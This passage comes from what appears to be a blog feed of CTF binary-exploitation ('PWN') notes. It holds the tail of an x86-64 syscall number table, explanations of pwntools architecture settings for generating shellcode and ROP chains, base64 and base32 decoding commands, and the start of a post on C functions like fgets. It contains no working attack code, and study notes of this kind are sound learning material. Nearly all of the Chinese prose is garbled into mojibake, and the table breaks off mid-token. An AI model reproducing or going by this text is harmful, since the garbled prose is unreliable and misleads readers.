class="line"><span class="meta">#<span class="keyword">define</span> __NR_getitimer 36</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_alarm 37</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setitimer 38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpid 39</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile 40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socket 41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_connect 42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_accept 43</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendto 44</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvfrom 45</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmsg 46</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmsg 47</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shutdown 48</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bind 49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listen 50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockname 51</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpeername 52</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketpair 53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsockopt 54</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockopt 55</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clone 56</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fork 57</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vfork 58</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execve 59</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit 60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_wait4 61</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kill 62</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uname 63</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semget 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semop 65</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semctl 66</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmdt 67</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgget 68</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgsnd 69</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgrcv 70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgctl 71</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fcntl 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flock 73</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsync 74</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fdatasync 75</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_truncate 76</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftruncate 77</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents 78</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcwd 79</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chdir 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchdir 81</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rename 82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdir 83</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rmdir 84</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_creat 85</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_link 86</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlink 87</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlink 88</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlink 89</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chmod 90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmod 91</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chown 92</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchown 93</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lchown 94</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umask 95</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettimeofday 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrlimit 97</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrusage 98</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysinfo 99</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_times 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ptrace 101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getuid 102</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syslog 103</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgid 104</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setuid 105</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgid 106</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_geteuid 107</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getegid 108</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpgid 109</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getppid 110</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgrp 111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsid 112</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid 113</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid 114</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgroups 115</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgroups 116</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresuid 117</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresuid 118</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresgid 119</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresgid 120</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgid 121</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsuid 122</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsgid 123</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsid 124</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capget 125</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capset 126</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigpending 127</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigtimedwait 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigqueueinfo 129</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigsuspend 130</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigaltstack 131</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utime 132</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknod 133</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uselib 134</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_personality 135</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ustat 136</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_statfs 137</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatfs 138</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysfs 139</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpriority 140</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpriority 141</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setparam 142</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getparam 143</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setscheduler 144</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getscheduler 145</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_max 146</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_min 147</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_rr_get_interval 148</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock 149</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlock 150</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlockall 151</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlockall 152</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vhangup 153</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_modify_ldt 154</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pivot_root 155</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__sysctl 156</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prctl 157</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_arch_prctl 158</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_adjtimex 159</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setrlimit 160</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chroot 161</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync 162</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_acct 163</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_settimeofday 164</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mount 165</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umount2 166</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapon 167</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapoff 168</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_reboot 169</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sethostname 170</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setdomainname 171</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_iopl 172</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioperm 173</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_create_module 174</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_init_module 175</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_delete_module 176</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_kernel_syms 177</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_query_module 178</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_quotactl 179</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nfsservctl 180</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpmsg 181</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_putpmsg 182</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_afs_syscall 183</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tuxcall 184</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_security 185</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettid 186</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readahead 187</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setxattr 188</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lsetxattr 189</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsetxattr 190</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getxattr 191</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lgetxattr 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fgetxattr 193</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listxattr 194</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_llistxattr 195</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flistxattr 196</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_removexattr 197</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lremovexattr 198</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fremovexattr 199</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tkill 200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_time 201</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futex 202</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setaffinity 203</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getaffinity 204</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_thread_area 205</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_setup 206</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_destroy 207</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_getevents 208</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_submit 209</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_cancel 210</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_thread_area 211</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lookup_dcookie 212</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create 213</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl_old 214</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_wait_old 215</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_remap_file_pages 216</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents64 217</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_tid_address 218</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_restart_syscall 219</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semtimedop 220</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fadvise64 221</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_create 222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_settime 223</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_gettime 224</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_getoverrun 225</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_delete 226</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_settime 227</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_gettime 228</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_getres 229</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_nanosleep 230</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit_group 231</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_wait 232</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl 233</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tgkill 234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimes 235</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vserver 236</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mbind 237</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_mempolicy 238</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_mempolicy 239</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_open 240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_unlink 241</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedsend 242</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedreceive 243</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_notify 244</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_getsetattr 245</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kexec_load 246</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_waitid 247</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_add_key 248</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_request_key 249</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_keyctl 250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_set 251</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_get 252</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init 253</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_add_watch 254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_rm_watch 255</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_migrate_pages 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_openat 257</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdirat 258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknodat 259</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchownat 260</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futimesat 261</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_newfstatat 262</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlinkat 263</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat 264</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_linkat 265</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlinkat 266</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlinkat 267</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmodat 268</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_faccessat 269</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pselect6 270</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ppoll 271</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unshare 272</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_robust_list 273</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_robust_list 274</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_splice 275</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync_file_range 277</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vmsplice 278</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_move_pages 279</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimensat 280</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_pwait 281</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sign</span></span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="arch-å‚æ•°è¯´æ˜">arch å‚æ•°è¯´æ˜</span></h2><h3><span id="archx3d39i38639"><strong>arch&#x3D;&#39;i386&#39;</strong></span></h3><blockquote>
<p>arch&#x3D;&#39;i386&#39; è¡¨ç¤ºç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯ä¸€ä¸ª 32 ä½çš„ x86 æ¶æ„çš„ç¨‹åºã€‚i386 æ˜¯ Intel 80386 å¤„ç†å™¨çš„ç®€ç§°ï¼Œå®ƒæ˜¯ç¬¬ä¸€ä¸ªæ”¯æŒ 32 ä½è®¡ç®—çš„ x86 å¤„ç†å™¨ã€‚åœ¨è¿™é‡Œï¼Œi386 ç”¨æ¥è¡¨ç¤ºç›®æ ‡ç¨‹åºæ˜¯ä¸€ä¸ª 32 ä½çš„ x86 ç¨‹åºã€‚ åœ¨ä½¿ç”¨ pwntools åº“è¿›è¡ŒäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨æ—¶ï¼Œéœ€è¦æ­£ç¡®è®¾ç½®ç›®æ ‡æ¶æ„å’Œæ“ä½œç³»ç»Ÿï¼Œä»¥ä¾¿åº“èƒ½å¤Ÿæ­£ç¡®åœ°ç”Ÿæˆ shellcodeã€ROP é“¾ç­‰æ”»å‡»è´Ÿè½½ã€‚å¦‚æœç›®æ ‡ç¨‹åºæ˜¯ä¸€ä¸ª 32 ä½çš„ x86 ç¨‹åºï¼Œé‚£ä¹ˆåº”è¯¥å°† arch è®¾ç½®ä¸º &#39;i386&#39;ã€‚</p>
</blockquote>
<h3><span id="archx3d39amd6439"><strong>arch&#x3D;&#39;amd64&#39;</strong></span></h3><blockquote>
<p>arch&#x3D;&#39;amd64&#39; è¡¨ç¤ºç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯ä¸€ä¸ª 64 ä½çš„ x86-64 æ¶æ„çš„ç¨‹åºã€‚amd64 æ˜¯ AMD å…¬å¸æ¨å‡ºçš„ä¸€ç§ 64 ä½å¤„ç†å™¨æ¶æ„ï¼Œå®ƒæ‰©å±•äº†åŸæœ‰çš„ x86 æ¶æ„ï¼Œæ”¯æŒ 64 ä½è®¡ç®—ã€‚åœ¨è¿™é‡Œï¼Œamd64 ç”¨æ¥è¡¨ç¤ºç›®æ ‡ç¨‹åºæ˜¯ä¸€ä¸ª 64 ä½çš„ x86-64 ç¨‹åºã€‚ ä¸ i386 ç±»ä¼¼ï¼Œåœ¨ä½¿ç”¨ pwntoolsåº“&amp;spm&#x3D;1001.2101.3001.7020è¿›è¡ŒäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨æ—¶ï¼Œéœ€è¦æ­£ç¡®è®¾ç½®ç›®æ ‡æ¶æ„å’Œæ“ä½œç³»ç»Ÿï¼Œä»¥ä¾¿åº“èƒ½å¤Ÿæ­£ç¡®åœ°ç”Ÿæˆ shellcodeã€ROP é“¾ç­‰æ”»å‡»è´Ÿè½½ã€‚å¦‚æœç›®æ ‡ç¨‹åºæ˜¯ä¸€ä¸ª 64 ä½çš„ x86-64 ç¨‹åºï¼Œé‚£ä¹ˆåº”è¯¥å°† arch è®¾ç½®ä¸º &#39;amd64&#39;ã€‚</p>
</blockquote>
<hr>
<h2><span id="ç¼–ç -x2f-è§£ç ">ç¼–ç  &#x2F; è§£ç </span></h2><h3><span id="base64-ç¼–ç "><strong>Base64 ç¼–ç ï¼š</strong></span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">base64</span> file</span><br><span class="line">åŠŸèƒ½ï¼šä»æŒ‡å®šçš„æ–‡ä»¶fileä¸­è¯»å–æ•°æ®ï¼Œç¼–ç ä¸º<span class="built_in">base64</span>çš„å­—ç¬¦ä¸²ç„¶åè¾“å‡ºï¼›</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;string&#x27;</span> | <span class="built_in">base64</span></span><br><span class="line">åŠŸèƒ½ï¼šå°†å­—ç¬¦ä¸²string+æ¢è¡Œç¼–ç ä¸º<span class="built_in">base64</span>çš„å­—ç¬¦ä¸²ç„¶åè¾“å‡ºï¼›</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;string&#x27;</span> | <span class="built_in">base64</span></span><br><span class="line">åŠŸèƒ½ï¼šå°†å­—ç¬¦ä¸²stringç¼–ç ä¸º<span class="built_in">base64</span>çš„å­—ç¬¦ä¸²ç„¶åè¾“å‡ºï¼›</span><br></pre></td></tr></table></figure>

<h3><span id="base64-è§£ç "><strong>Base64 è§£ç ï¼š</strong></span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">base64</span> -d file</span><br><span class="line">åŠŸèƒ½ï¼šä»æŒ‡å®šçš„æ–‡ä»¶fileä¸­è¯»å–å·²ç»è¿‡<span class="built_in">base64</span>ç¼–ç çš„æ•°æ®ï¼Œç„¶åè¿›è¡Œè§£ç ï¼Œå¹¶è¾“å‡ºè§£ç åçš„å­—ç¬¦ä¸²ï¼›</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;str&#x27;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">åŠŸèƒ½ï¼šå¯¹<span class="built_in">base64</span>ç¼–ç çš„å­—ç¬¦ä¸²strå’Œç©ºè¡Œè¿›è¡Œè§£ç ï¼Œç„¶åå°†è§£ç åçš„å­—ç¬¦ä¸²è¾“å‡ºï¼›</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;str&#x27;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">åŠŸèƒ½ï¼šå¯¹<span class="built_in">base64</span>ç¼–ç çš„å­—ç¬¦ä¸²strè¿›è¡Œè§£ç ï¼Œç„¶åå°†è§£ç åçš„å­—ç¬¦ä¸²è¾“å‡ºï¼›</span><br><span class="line"></span><br><span class="line">import <span class="built_in">base64</span></span><br><span class="line">key = <span class="string">&#x27;ç¼–ç &#x27;</span></span><br><span class="line">key = base64.b64decode(key)</span><br></pre></td></tr></table></figure>

<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(3)/1.png"></p>
<h3><span id="base32-è§£ç "><strong>Base32 è§£ç ï¼š</strong></span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import <span class="built_in">base64</span></span><br><span class="line">key = <span class="string">&#x27;ç¼–ç &#x27;</span></span><br><span class="line">key = base64.b32decode(key)</span><br></pre></td></tr></table></figure>

<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(3)/2.png"></p>
<hr>
<h1><span id="æ€»ç»“">æ€»ç»“ï¼š</span></h1><p>è¿™æ¬¡å°±è®°å½•äº†ä¸€äº›åš PWN é¢˜æ—¶å¸¸è§çš„ç¼–ç ä¸ç³»ç»Ÿè°ƒç”¨å·ï¼Œåç»­ç»§ç»­è¡¥å……ï¼ŒåŠ æ²¹ï¼ğŸ”¥ğŸ”¥ğŸ”¥</p>
]]></content>
      <categories>
        <category>æŠ€å·§</category>
        <category>æ–¹æ³•</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN PWN PWN !!! æŠ€å·§ (5)</title>
    <url>/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(5)/</url>
    <content><![CDATA[<p>PWN PWN PWN !!! æŠ€å·§ (5)</p>
<span id="more"></span>

<h1><span id="ç®€ä»‹">ç®€ä»‹ï¼š</span></h1><p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! æŠ€å·§ (1)</a></p>
<p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/">PWN PWN PWN !!! æŠ€å·§ (2)</a></p>
<p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/">PWN PWN PWN !!! æŠ€å·§ (3)</a></p>
<p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(4)/">PWN PWN PWN !!! æŠ€å·§ (4)</a></p>
<p>ç´§æ¥ä¸Šç»­å››éƒ¨ï¼Œè¿™æ¬¡å‡†å¤‡è®°å½•ä¸€ä¸‹å¸¸è§çš„å‡½æ•°çš„åŠŸèƒ½ï¼ˆå®¹æ˜“å¿˜è®°ï¼Œè®°å½•ä¸€æ‰‹ï¼‰ï¼Œå¥½è®°æ€§ä¸å¦‚çƒ‚ç¬”å¤´ã€‚</p>
<hr>
<h2><span id="fgets">fgets</span></h2><p><code>fgets</code> ç”¨äºä»æŒ‡å®šçš„æµä¸­è¯»å–ä¸€è¡Œæ–‡æœ¬æˆ–å­—ç¬¦ä¸²ï¼Œå¹¶å°†å…¶å­˜å‚¨åˆ°æŒ‡å®šçš„å­—ç¬¦ä¸²å˜é‡ä¸­ï¼š</p>
